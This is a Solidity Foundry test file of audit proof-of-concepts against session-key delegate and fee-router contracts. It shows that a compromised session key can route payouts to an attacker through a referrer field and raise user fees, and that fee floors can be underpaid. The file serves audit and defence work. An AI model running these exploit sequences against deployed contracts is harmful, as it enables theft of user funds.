// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {SessionKeyDelegate} from "../src/SessionKeyDelegate.sol";
import {FeeRouter, Route} from "../src/FeeRouter.sol";

contract MockERC20c {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

contract MockRouterC {
    MockERC20c public immutable tokenOut;
    constructor(MockERC20c o) { tokenOut = o; }
    function swapExactTokensForTokens(uint256 amountIn, uint256 min, Route[] calldata r, address to, uint256)
        external returns (uint256[] memory a)
    {
        MockERC20c(r[0].from).transferFrom(msg.sender, address(this), amountIn);
        uint256 out = amountIn * 2;
        require(out >= min, "slippage");
        tokenOut.mint(to, out);
        a = new uint256[](2); a[0] = amountIn; a[1] = out;
    }
}

/**
 * A2 — access-control re-audit PoCs against the POST-FIX source.
 */
contract ZZA2 is Test {
    // --- shared ---
    MockERC20c tin;
    MockERC20c tout;
    MockRouterC router;
    FeeRouter fr;

    // --- delegate side ---
    SessionKeyDelegate delegate; // acts as the 7702 account itself
    address sessionKey = address(0x5E5510);
    address attacker = address(0xA77ACC);

    bytes4 constant SEL_TRANSFER = bytes4(keccak256("transfer(address,uint256)"));
    bytes4 constant SEL_APPROVE = bytes4(keccak256("approve(address,uint256)"));
    // exactly what src/custody/delegation.ts grants on the FeeRouter target
    bytes4 constant SEL_SWAP_WITH_FEE =
        bytes4(keccak256("swapWithFee(uint256,uint256,(address,address,bool,address)[],uint256,address,uint16,uint16)"));

    address operator = address(0xFEE);
    address user = address(0xBEEF);

    function setUp() public {
        tin = new MockERC20c();
        tout = new MockERC20c();
        router = new MockRouterC(tout);
        fr = new FeeRouter(address(router), operator, 50, 3000); // feeBps=50, maxRefShare=30%
        delegate = new SessionKeyDelegate();
        tin.mint(address(delegate), 1_000e18);
        tin.mint(user, 1_000e18);
        vm.prank(user);
        tin.approve(address(fr), type(uint256).max);
    }

    function _routes() internal view returns (Route[] memory r) {
        r = new Route[](1);
        r[0] = Route({from: address(tin), to: address(tout), stable: false, factory: address(0xFAC)});
    }

    // ─────────────────────────────────────────────────────────────────────────
    // PoC 1 — SessionKeyDelegate: the new swap-recipient decode enumerates only
    // the 3 Router selectors and misses `swapWithFee`, which the repo grants and
    // which carries an attacker-chosen PAYEE (`referrer`) in its calldata.
    // ─────────────────────────────────────────────────────────────────────────
    function _installRealWorldScope() internal {
        SessionKeyDelegate.TargetPolicy[] memory p = new SessionKeyDelegate.TargetPolicy[](2);

        bytes4[] memory frSels = new bytes4[](1);
        frSels[0] = SEL_SWAP_WITH_FEE;
        p[0] = SessionKeyDelegate.TargetPolicy({
            target: address(fr), selectors: frSels, tokenPerTxCap: 0, tokenDailyCap: 0
        });

        bytes4[] memory tokSels = new bytes4[](2);
        tokSels[0] = SEL_APPROVE;
        tokSels[1] = SEL_TRANSFER;
        p[1] = SessionKeyDelegate.TargetPolicy({
            target: address(tin), selectors: tokSels, tokenPerTxCap: 100e18, tokenDailyCap: 150e18
        });

        vm.prank(address(delegate));
        delegate.registerSession(sessionKey, uint48(block.timestamp + 30 days), 1 ether, 2 ether, p);
    }

    /// The guard that SHOULD stop a payout to a non-target: it works for transfer().
    function test_A_directTransferToAttackerIsBlocked() public {
        _installRealWorldScope();
        vm.prank(sessionKey);
        vm.expectRevert(abi.encodeWithSelector(SessionKeyDelegate.SpenderNotAllowed.selector, attacker));
        delegate.execute(address(tin), 0, abi.encodeWithSelector(SEL_TRANSFER, attacker, 1e18));
    }

    /// ...and the identical payout goes through via swapWithFee's `referrer`.
    function test_B_swapWithFeeReferrerPaysArbitraryAddress() public {
        _installRealWorldScope();

        // approve is decoded + capped (100e18 per tx) — this is the ONLY metering.
        vm.prank(sessionKey);
        delegate.execute(address(tin), 0, abi.encodeWithSelector(SEL_APPROVE, address(fr), 100e18));

        uint256 ringBefore = delegate.tokenUsage(sessionKey, address(fr));
        assertEq(attacker.balance, 0);
        assertEq(tin.balanceOf(attacker), 0, "attacker starts empty");

        // Compromised key: max fee override (200 = 2%), max referral share, payee = attacker.
        vm.prank(sessionKey);
        delegate.execute(
            address(fr),
            0,
            abi.encodeWithSelector(
                SEL_SWAP_WITH_FEE,
                uint256(100e18), uint256(0), _routes(), block.timestamp + 600,
                attacker, uint16(10_000), uint16(200)
            )
        );

        // fee = 100e18 * 200 / 10_000 = 2e18 ; referrer share = 30% = 0.6e18
        assertEq(tin.balanceOf(attacker), 0.6e18, "arbitrary non-target address was paid");
        // The user's fee was silently DOUBLED from the 50 bps headline to 200 bps.
        assertEq(tin.balanceOf(operator), 1.4e18, "user charged 2% instead of 0.5%");
        // Nothing was charged to any ring for the FeeRouter call itself.
        assertEq(delegate.tokenUsage(sessionKey, address(fr)), ringBefore, "no metering on the swapWithFee call");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // PoC 2 — FeeRouter.setConfig ratchets referredFeeBps DOWN and never back up,
    // so restoring the headline rate after a promo leaves a permanently stale
    // discount FLOOR that any caller can claim by naming any address.
    // ─────────────────────────────────────────────────────────────────────────
    function test_C_setConfigRatchetsDiscountFloorDownForever() public {
        FeeRouter f2 = new FeeRouter(address(router), operator, 100, 3000); // 1% headline
        assertEq(f2.referredFeeBps(), 90, "constructor: 90 bps discount");

        f2.setConfig(operator, 10, 3000); // promo week: drop to 0.1%
        assertEq(f2.referredFeeBps(), 10, "clamped down with the headline");

        f2.setConfig(operator, 100, 3000); // promo over: restore 1%
        assertEq(f2.feeBps(), 100, "headline restored");
        assertEq(f2.referredFeeBps(), 10, "discount floor STAYS at 10 bps");

        // Any caller now pays 10 bps by naming ANY address as referrer.
        vm.prank(user);
        tin.approve(address(f2), type(uint256).max);
        vm.prank(user);
        f2.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0xDEAD), 0, 10);

        assertEq(tin.balanceOf(operator), 0.1e18, "operator got 10 bps, not 100 bps");
        // Honest caller with no referrer still cannot underpay:
        vm.prank(user);
        vm.expectRevert(FeeRouter.FeeTooHigh.selector);
        f2.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0), 0, 10);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // PoC 3 — the two-sided floor's LOWER bound is feeBps, but the zap leg's
    // correct rate is 2x feeBps, so every zap can be underpaid by 50%.
    // ─────────────────────────────────────────────────────────────────────────
    function test_D_zapHalfLegUnderpaidFiftyPercent() public {
        // src/surfaces/zap.ts: zapFeeBpsOverride = min(effBps * 2, 200) = 100.
        vm.prank(user);
        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0), 0, 100);
        assertEq(tin.balanceOf(operator), 1e18, "intended zap fee on the half-leg");

        // Same call with the plain-swap rate passes the floor (50 >= feeBps 50).
        vm.prank(user);
        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0), 0, 50);
        assertEq(tin.balanceOf(operator), 1e18 + 0.5e18, "only half the zap fee collected");
    }
}
